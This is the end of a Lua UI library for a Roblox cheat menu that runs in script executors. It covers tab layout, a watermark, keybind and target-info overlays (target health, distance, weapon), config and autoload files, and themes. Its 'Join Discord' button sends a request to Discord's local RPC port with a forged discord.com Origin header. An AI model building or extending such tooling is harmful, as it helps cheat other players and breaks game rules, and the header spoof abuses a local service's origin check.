            tab:SetText(tab.text);
            window:UpdateTabs();
            return tab;
        end

        function window:UpdateTabs()
            table.sort(self.tabs, function(a,b)
                return a.order < b.order
            end)

            -- // keep the tabs inside the sidebar:
            -- 1. if they don't fit, the dog picture makes room   2. rows shrink (down to 22px)
            -- 3. if they still don't fit, the list scrolls (wheel / finger drag) and rows outside are hidden
            local wobjs = self.objects
            local ROW, GAP = 30, 4;
            local count = #self.tabs
            local sidebarH = wobjs.sidebar.Object.Size.Y
            local function needed(row) return count * (row + GAP) - GAP end
            local room = self.mascotRoom or 0
            if room > 0 and needed(ROW) > sidebarH - 44 - room then
                room = 0
            end
            if wobjs.mascot and wobjs.mascot.Visible ~= (room > 0) then
                wobjs.mascot.Visible = room > 0
            end
            local listH = math.max(sidebarH - 44 - room, ROW)
            if wobjs.tabHolder.Size.Y.Offset ~= -44 - room then
                wobjs.tabHolder.Size = newUDim2(1,-16,1,-44 - room)
            end
            if needed(ROW) > listH then
                ROW = math.max(22, floor((listH + GAP) / math.max(count, 1)) - GAP)
            end
            self.maxTabScroll = math.max(needed(ROW) - listH, 0)
            self.tabScroll = clamp(self.tabScroll or 0, 0, self.maxTabScroll)

            local pos = -self.tabScroll;
            local selectedShown = false
            for i,v in next, self.tabs do
                local objs = v.objects;
                v.selected = v == self.selectedTab;
                objs.background.ThemeColor = v.selected and 'Selected Tab Background' or 'Unselected Tab Background';
                objs.background.ThemeColorOffset = (not v.selected and objs.background.Hover) and 5 or 0;
                objs.background.Size = newUDim2(1, 0, 0, ROW);
                objs.background.Position = newUDim2(0, 0, 0, pos);
                local fits = pos >= 0 and pos + ROW <= listH
                if objs.background.Visible ~= fits then
                    objs.background.Visible = fits
                end
                if v.selected and fits then
                    selectedShown = true
                end

                -- name (and icon, if any) centered in the row
                if objs.icon then
                    local ICON, GAP_ICON = 13, 6;
                    local total = ICON + GAP_ICON + objs.text.TextBounds.X;
                    local start = -total / 2;
                    objs.icon.Position = newUDim2(.5, floor(start), .5, -6);
                    objs.text.Center = false;
                    objs.text.Position = newUDim2(.5, floor(start + ICON + GAP_ICON), .5, -7);
                else
                    objs.text.Center = true;
                    objs.text.Position = newUDim2(.5, 0, .5, -7);
                end
                objs.text.ThemeColor = (v.selected or objs.background.Hover) and 'Selected Tab Text' or 'Unselected Tab Text';

                if v.selected then
                    local indicator = self.objects.tabIndicator;
                    local targetPos = newUDim2(0, 0, 0, pos);
                    local targetSize = newUDim2(0, 2, 0, ROW);
                    local anim = library.animations;
                    local placed = indicator.Size.Y.Offset > 0;

                    if placed and self.open and anim.enabled and anim.indicator > 0 then
                        if indicator.Position ~= targetPos then
                            utility:Tween(indicator, 'Position', targetPos, anim.indicator, Enum.EasingDirection.Out, Enum.EasingStyle.Quint);
                        end
                        if indicator.Size ~= targetSize then
                            utility:Tween(indicator, 'Size', targetSize, anim.indicator, Enum.EasingDirection.Out, Enum.EasingStyle.Quint);
                        end
                    else
                        indicator.Position = targetPos;
                        indicator.Size = targetSize;
                    end
                end

                pos += ROW + GAP

                v:UpdateSections();

            end

            -- the accent bar only shows while the selected tab is in view
            if self.objects.tabIndicator.Visible ~= selectedShown then
                self.objects.tabIndicator.Visible = selectedShown
            end
        end

        window:SetOpen(true);
        return window;
    end

    -- Tooltip
    do
        local z = library.zindexOrder.window + 2000;
        tooltipObjects.background = utility:Draw('Square', {
            ThemeColor = 'Group Background';
            ZIndex = z;
            Visible = false;
        })

        tooltipObjects.border1 = utility:Draw('Square', {
            Size = UDim2.new(1,2,1,2);
            Position = UDim2.new(0,-1,0,-1);
            ThemeColor = 'Border 1';
            ZIndex = z-1;
            Parent = tooltipObjects.background;
        })

        tooltipObjects.border2 = utility:Draw('Square', {
            Size = UDim2.new(1,4,1,4);
            Position = UDim2.new(0,-2,0,-2);
            ThemeColor = 'Border 3';
            ZIndex = z-2;
            Parent = tooltipObjects.background;
        })

        tooltipObjects.text = utility:Draw('Text', {
            Position = UDim2.new(0,3,0,0);
            ThemeColor = 'Primary Text';
            Size = 13;
            Font = 2;
            ZIndex = z+1;
            Outline = true;
            Parent = tooltipObjects.background;
        })

        tooltipObjects.riskytext = utility:Draw('Text', {
            Position = UDim2.new(0,3,0,0);
            ThemeColor = 'Risky Text Enabled';
            Text = '[RISKY]';
            Size = 13;
            Font = 2;
            ZIndex = z+1;
            Outline = true;
            Parent = tooltipObjects.background;
        })

    end
    
    -- Watermark
    do
        -- optional user info: pass startupArgs.user = {User = 'name', UID = 1}, defaults to the local player
        local userInfo = startupArgs.user or {
            User = localplayer and localplayer.Name or 'user',
            UID = localplayer and localplayer.UserId or 0,
        }
        self.watermark = {
            objects = {};
            text = {
                {self.cheatname, true},
                {("%s (uid %s)"):format(tostring(userInfo.User), tostring(userInfo.UID)), true},
                {self.gamename, true},
                {'0 fps', true},
                {'0ms', true},
                {'00:00:00', true},
                {'M, D, Y', true},
            };
            -- nil = default spot (very top, centered). otherwise Vector2(centerX, topY) set by dragging,
            -- stored as the center so the watermark stays put while its text width changes
            anchor = nil;
            position = newUDim2(0,0,0,0);
            refreshrate = 250; -- ms between text updates (was 25 = 40 rebuilds a second)
        }

        function self.watermark:ApplyPosition()
            local size = self.objects.background.Object.Size;
            local screensize = workspace.CurrentCamera.ViewportSize;
            local anchor = self.anchor or newVector2(screensize.X / 2, 4);
            local x = clamp(anchor.X - size.X / 2, 0, math.max(screensize.X - size.X, 0));
            local y = clamp(anchor.Y, 0, math.max(screensize.Y - size.Y, 0));
            self.position = newUDim2(0, floor(x), 0, floor(y));
            self.objects.background.Position = self.position;
        end

        function self.watermark:SetAnchor(anchor)
            self.anchor = typeof(anchor) == 'Vector2' and anchor or nil;
            self:ApplyPosition();
        end

        function self.watermark:Update()
            self.objects.background.Visible = library.flags.watermark_enabled == true
            if library.flags.watermark_enabled then
                local day = tonumber(os.date('%d',os.time())) or 1
                local lastDigit = day % 10
                local suffix = (day >= 11 and day <= 13) and 'th' or (lastDigit == 1 and 'st' or lastDigit == 2 and 'nd' or lastDigit == 3 and 'rd' or 'th')
                local date = {os.date('%b',os.time()), tostring(day)..suffix, os.date('%Y',os.time())}

                self.text[4][1] = library.stats.fps..' fps'
                self.text[5][1] = floor(library.stats.ping)..'ms'
                self.text[6][1] = os.date('%X', os.time())
                self.text[7][1] = table.concat(date, ', ')

                local text = {};
                for _,v in next, self.text do
                    if v[2] then
                        table.insert(text, v[1]);
                    end
                end

                self.objects.text.Text = table.concat(text,' | ')
                self.objects.background.Size = newUDim2(0, self.objects.text.TextBounds.X + 10, 0, 17)

                -- don't fight the mouse while it's being dragged
                if not (self.drag and self.drag.dragging) then
                    self:ApplyPosition()
                end
            end
        end

        do
            local objs = self.watermark.objects;
            local z = self.zindexOrder.watermark;
            
            objs.background = utility:Draw('Square', {
                Visible = false;
                Size = newUDim2(0, 200, 0, 17);
                Position = newUDim2(0,800,0,100);
                ThemeColor = 'Background';
                ZIndex = z;
            })

            objs.border1 = utility:Draw('Square', {
                Size = newUDim2(1,2,1,2);
                Position = newUDim2(0,-1,0,-1);
                ThemeColor = 'Border 2';
                Parent = objs.background;
                ZIndex = z-1;
            })

            objs.border2 = utility:Draw('Square', {
                Size = newUDim2(1,2,1,2);
                Position = newUDim2(0,-1,0,-1);
                ThemeColor = 'Border 3';
                Parent = objs.border1;
                ZIndex = z-2;
            })
            
            objs.topbar = utility:Draw('Square', {
                Size = newUDim2(1,0,0,1);
                ThemeColor = 'Accent';
                ZIndex = z+1;
                Parent = objs.background;
            })

            objs.text = utility:Draw('Text', {
                Position = newUDim2(.5,0,0,2);
                ThemeColor = 'Primary Text';
                Text = 'Watermark Text';
                Size = 13;
                Font = 2;
                ZIndex = z+1;
                Outline = true;
                Center = true;
                Parent = objs.background;
            })

            -- drag it anywhere while the menu is open
            local watermark = self.watermark
            watermark.drag = utility:MakeDraggable({objs.background, objs.topbar}, function()
                return objs.background.Object.Position
            end, function(p)
                local size = objs.background.Object.Size
                watermark.anchor = newVector2(p.X + size.X / 2, p.Y)
                watermark:ApplyPosition()
            end, function()
                if watermark.onMoved then
                    watermark.onMoved(watermark.anchor)
                end
            end)

        end
    end

    local lasttick = tick();
    utility:Connection(runservice.RenderStepped, function(step)
        if step > 0 then
            library.stats.fps = floor(1/step)
        end
        pcall(function()
            library.stats.ping = stats.Network.ServerStatsItem["Data Ping"]:GetValue()
            library.stats.sendkbps = stats.DataSendKbps
            library.stats.receivekbps = stats.DataReceiveKbps
        end)

        if (tick()-lasttick)*1000 > library.watermark.refreshrate then
            lasttick = tick()
            local ok, err = pcall(library.watermark.Update, library.watermark)
            if not ok then
                log('watermark update failed: '..tostring(err))
            end
        end
    end)

    -- default spots: keybinds on the left edge around 40% down the screen, target info under it
    local defaultPositions = {
        keybinds = newUDim2(0, 12, .4, 0),
        target = newUDim2(0, 12, .62, 0),
    }

    self.keyIndicator = self.NewIndicator({title = 'Keybinds', position = defaultPositions.keybinds, enabled = false});
    
    self.targetIndicator = self.NewIndicator({title = 'Target Info', position = defaultPositions.target, enabled = false});
    self.targetName = self.targetIndicator:AddValue({key = 'Name     :', value = 'nil'})
    self.targetDisplay = self.targetIndicator:AddValue({key = 'DName    :', value = 'nil'})
    self.targetHealth = self.targetIndicator:AddValue({key = 'Health   :', value = '0'})
    self.targetDistance = self.targetIndicator:AddValue({key = 'Distance :', value = '0m'})
    self.targetTool = self.targetIndicator:AddValue({key = 'Weapon   :', value = 'nil'})

    -- // Layout
    -- dragged positions of the watermark and indicators are remembered between sessions
    -- (one file for every game, since it's about your screen, not the game)
    local layoutPath = self.cheatname..'/layout.json'
    local layoutIndicators = {
        keybinds = self.keyIndicator,
        target = self.targetIndicator,
    }

    function self:SaveLayout()
        if not writefile then return end
        local data = {}
        if self.watermark.anchor then
            data.watermark = {self.watermark.anchor.X, self.watermark.anchor.Y}
        end
        for name, indicator in next, layoutIndicators do
            if indicator.moved then
                data[name] = {indicator.position.X.Offset, indicator.position.Y.Offset}
            end
        end
        pcall(writefile, layoutPath, http:JSONEncode(data))
    end

    function self:ResetLayout()
        self.watermark:SetAnchor(nil)
        for name, indicator in next, layoutIndicators do
            indicator.moved = false
            indicator:SetPosition(defaultPositions[name])
        end
        if delfile and isfile and isfile(layoutPath) then
            pcall(delfile, layoutPath)
        end
    end

    self.watermark.onMoved = function()
        self:SaveLayout()
    end
    for _, indicator in next, layoutIndicators do
        indicator.onMoved = function()
            indicator.moved = true
            self:SaveLayout()
        end
    end

    -- restore the saved layout
    if isfile and readfile and isfile(layoutPath) then
        pcall(function()
            local data = http:JSONDecode(readfile(layoutPath))
            if typeof(data.watermark) == 'table' then
                self.watermark.anchor = newVector2(tonumber(data.watermark[1]) or 0, tonumber(data.watermark[2]) or 0)
            end
            for name, indicator in next, layoutIndicators do
                local p = data[name]
                if typeof(p) == 'table' then
                    indicator.moved = true
                    indicator:SetPosition(newUDim2(0, tonumber(p[1]) or 0, 0, tonumber(p[2]) or 0))
                end
            end
        end)
    end

    self:SetTheme(library.theme);
    self:SetOpen(true);
    self.hasInit = true

end

-- Adds the only two light settings players can change (Colors + Reverse Direction) to any section,
-- e.g. a Festive tab:  library:AddLightControls(festiveTab:AddSection('Lights', 1))
-- the lights themselves, the dog picture and the discord invite are always on.
-- options use the flags 'lights_palette' and 'lights_reverse', so configs save them.
function library:AddLightControls(section)
    local lights = library.lights
    local colors = section:AddList({text = 'Light Colors', flag = 'lights_palette', values = library.lightPaletteNames, callback = function(name)
        lights.palette = name
    end})
    colors:Select(lights.palette, true)
    local reverse = section:AddToggle({text = 'Reverse Direction', flag = 'lights_reverse', state = lights.reverse, callback = function(bool)
        lights.reverse = bool
    end})
    return colors, reverse
end

function library:CreateSettingsTab(menu)
    local settingsTab = menu:AddTab('Settings', 999, library.IconPNG('2699'));
    local configSection = settingsTab:AddSection('Config', 2);
    local mainSection = settingsTab:AddSection('Main', 1);

    configSection:AddBox({text = 'Config Name', flag = 'configinput'})
    configSection:AddList({text = 'Config', flag = 'selectedconfig'})

    local configFolder = self.cheatname..'/'..self.gamename..'/configs'

    local function refreshConfigs()
        local list = library.options.selectedconfig
        list:ClearValues();

        local ok, files = pcall(function()
            return listfiles and listfiles(configFolder) or {}
        end)
        if not ok or typeof(files) ~= 'table' then
            files = {}
        end

        for _,v in next, files do
            -- executors return either \ or / separators
            local fileName = tostring(v):gsub('\\', '/'):match('([^/]+)$') or tostring(v)
            if fileName:sub(-#self.fileext) == self.fileext then
                list:AddValue(fileName:sub(1, -#self.fileext - 1))
            end
        end

        -- keep the current selection if it still exists, otherwise pick the first config
        if not table.find(list.values, list.selected) then
            if list.values[1] then
                list:Select(list.values[1], true)
            else
                list.selected = ''
                list.objects.inputText.Text = 'none'
                library.flags.selectedconfig = ''
            end
        end
    end

    local function validConfigName(name)
        return typeof(name) == 'string' and name:gsub('%s', '') ~= '' and not name:find('[\\/:%*%?"<>|]')
    end

    configSection:AddButton({text = 'Load', confirm = true, callback = function()
        library:LoadConfig(library.flags.selectedconfig);
    end}):AddButton({text = 'Save', confirm = true, callback = function()
        library:SaveConfig(library.flags.selectedconfig);
    end})

    configSection:AddButton({text = 'Create', confirm = true, callback = function()
        local name = library.flags.configinput
        if not validConfigName(name) then
            library:SendNotification('Enter a valid config name first.', 5, c3new(1,0,0));
            return
        end
        if library:GetConfig(name) then
            library:SendNotification('Config \''..name..'\' already exists.', 5, c3new(1,0,0));
            return
        end
        if not writefile then
            library:SendNotification('Your executor does not support writefile.', 5, c3new(1,0,0));
            return
        end
        writefile(configFolder..'/'..name..self.fileext, http:JSONEncode({}));
        refreshConfigs()
        library.options.selectedconfig:Select(name)
        library:SendNotification('Created config: '..name, 5, c3new(0,1,0));
    end}):AddButton({text = 'Delete', confirm = true, callback = function()
        local name = library.flags.selectedconfig
        if library:GetConfig(name) and delfile then
            delfile(configFolder..'/'..name..self.fileext);
            refreshConfigs()
            if library:GetAutoload() == name then
                library:SetAutoload(nil)
            end
            library:SendNotification('Deleted config: '..name, 5, c3new(0,1,0));
        end
    end})

    -- // Autoload
    -- the chosen config name is stored per game and loaded automatically next time the script runs
    local autoloadPath = self.cheatname..'/'..self.gamename..'/autoload.txt'
    local autoloadLabel

    function library:GetAutoload()
        if isfile and readfile and isfile(autoloadPath) then
            local ok, name = pcall(readfile, autoloadPath)
            if ok and typeof(name) == 'string' and name ~= '' then
                return name
            end
        end
        return nil
    end

    function library:SetAutoload(name)
        if name then
            if writefile then
                pcall(writefile, autoloadPath, name)
            end
        elseif delfile and isfile and isfile(autoloadPath) then
            pcall(delfile, autoloadPath)
        end
        if autoloadLabel then
            autoloadLabel:SetText('Autoload: '..(name or 'none'))
        end
    end

    configSection:AddSeparator({text = 'Autoload'})
    autoloadLabel = configSection:AddText({text = 'Autoload: '..(library:GetAutoload() or 'none')})

    configSection:AddButton({text = 'Set Autoload', callback = function()
        local name = library.flags.selectedconfig
        if not library:GetConfig(name) then
            library:SendNotification('Select a config to autoload first.', 5, c3new(1,0,0));
            return
        end
        library:SetAutoload(name)
        library:SendNotification('Autoload set to: '..name, 5, c3new(0,1,0));
    end}):AddButton({text = 'Clear Autoload', callback = function()
        library:SetAutoload(nil)
        library:SendNotification('Autoload cleared.', 5);
    end})

    refreshConfigs()

    mainSection:AddBind({text = 'Open / Close', flag = 'togglebind', nomouse = true, noindicator = true, bind = Enum.KeyCode.End, callback = function()
        library:SetOpen(not library.open)
    end});

    mainSection:AddToggle({text = 'Disable Movement If Open', flag = 'disablemenumovement', callback = function(bool)
        if bool and library.open then
            actionservice:BindAction(
                'FreezeMovement',
                function()
                    return Enum.ContextActionResult.Sink
                end,
                false,
                unpack(Enum.PlayerActions:GetEnumItems())
            )
        else
            actionservice:UnbindAction('FreezeMovement');
        end
    end})

    mainSection:AddButton({text = 'Join Discord', flag = 'joindiscord', confirm = true, callback = function()
        if not httpRequest then
            setclip(library.discord)
            library:SendNotification('Executor has no request function, invite copied instead.', 5);
            return
        end
        local ok, res = pcall(httpRequest, {
            Url = 'http://127.0.0.1:6463/rpc?v=1',
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json',
                Origin = 'https://discord.com'
            },
            Body = game:GetService('HttpService'):JSONEncode({
                cmd = 'INVITE_BROWSER',
                nonce = game:GetService('HttpService'):GenerateGUID(false),
                args = {code = (tostring(library.discord):match('([%w%-_]+)$') or library.discord)}
            })
        })
        if ok and typeof(res) == 'table' and res.Success then
            library:SendNotification(library.cheatname..' | joined discord', 3);
        end
    end})
    
    mainSection:AddButton({text = 'Copy Discord', flag = 'copydiscord', callback = function()
        if setclip(library.discord) then
            library:SendNotification('Discord invite copied.', 3);
        end
    end})

    mainSection:AddButton({text = 'Rejoin Server', confirm = true, callback = function()
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId);
    end})

    mainSection:AddButton({text = 'Rejoin Game', confirm = true, callback = function()
        game:GetService("TeleportService"):Teleport(game.PlaceId);
    end})

    mainSection:AddButton({text = 'Copy Join Script', callback = function()
        setclip(([[game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")]]):format(game.PlaceId, game.JobId))
    end})

    mainSection:AddButton({text = 'Copy Game Invite', callback = function()
        setclip(([[Roblox.GameLauncher.joinGameInstance(%s, "%s")]]):format(game.PlaceId, game.JobId))
    end})

    mainSection:AddButton({text = 'Unload', confirm = true, callback = function()
        library:Unload();
    end})

    mainSection:AddSeparator({text = 'Keybinds'});
    -- the keybind list and watermark are dragged into place with the mouse while the menu is open
    mainSection:AddSeparator({text = 'Overlay'});
    mainSection:AddToggle({text = 'Keybind Indicator', flag = 'keybind_indicator', tooltip = 'Drag it anywhere while the menu is open', callback = function(bool)
        library.keyIndicator:SetEnabled(bool);
    end})
    mainSection:AddToggle({text = 'Watermark', flag = 'watermark_enabled', tooltip = 'Drag it anywhere while the menu is open'});
    mainSection:AddButton({text = 'Reset Positions', confirm = true, callback = function()
        library:ResetLayout()
        library:SendNotification('Overlay positions reset.', 4);
    end})

    local themeStrings = {"Custom"};
    for _,v in next, library.themes do
        table.insert(themeStrings, v.name)
    end
    local themeTab = menu:AddTab('Theme', 990, library.IconPNG('1f3a8'));
    local themeSection = themeTab:AddSection('Theme', 1);
    local setByPreset = false

    themeSection:AddList({text = 'Presets', flag = 'preset_theme', values = themeStrings, callback = function(newTheme)
        if newTheme == "Custom" then return end
        setByPreset = true
        for _,v in next, library.themes do
            if v.name == newTheme then
                -- update the pickers without callbacks, then recolor everything once
                -- (before, every picker re-applied the whole theme: ~20 full recolors per preset)
                for x, d in pairs(library.options) do
                    if d.class == 'color' and v.theme[tostring(x)] ~= nil then
                        d:SetColor(v.theme[tostring(x)], true)
                    end
                end
                library:SetTheme(v.theme)
                break
            end
        end
        setByPreset = false
    end}):Select(library.themes[1].name);

    -- stable order for the color pickers (pairs order is random)
    local themeKeys = {}
    for i in next, library.theme do
        table.insert(themeKeys, i)
    end
    table.sort(themeKeys)

    -- colors split over both columns so the tab fits the window
    local colorSection = themeTab:AddSection('Colors', 2);
    local half = math.ceil(#themeKeys / 2)
    for idx, i in ipairs(themeKeys) do
        local target = idx <= half and themeSection or colorSection
        target:AddColor({text = i, flag = i, color = library.theme[i], callback = function(c3)
            library.theme[i] = c3
            library:SetTheme(library.theme)
            if not setByPreset and not setByConfig then
                library.options.preset_theme:Select('Custom')
            end
        end});
    end

    -- load the autoload config once everything (including the theme pickers) exists.
    -- deferred a moment so options the script adds right after this call still get their values.
    local autoloadName = library:GetAutoload()
    if autoloadName then
        task.delay(.5, function()
            if not library.hasInit then return end -- unloaded in the meantime
            if library:GetConfig(autoloadName) then
                library:LoadConfig(autoloadName)
                if table.find(library.options.selectedconfig.values, autoloadName) then
                    library.options.selectedconfig:Select(autoloadName, true)
                end
            else
                library:SendNotification('Autoload config \''..autoloadName..'\' no longer exists.', 5, c3new(1,0,0));
                library:SetAutoload(nil)
            end
        end)
    end

    return settingsTab;
end

getgenv().library = library
return library
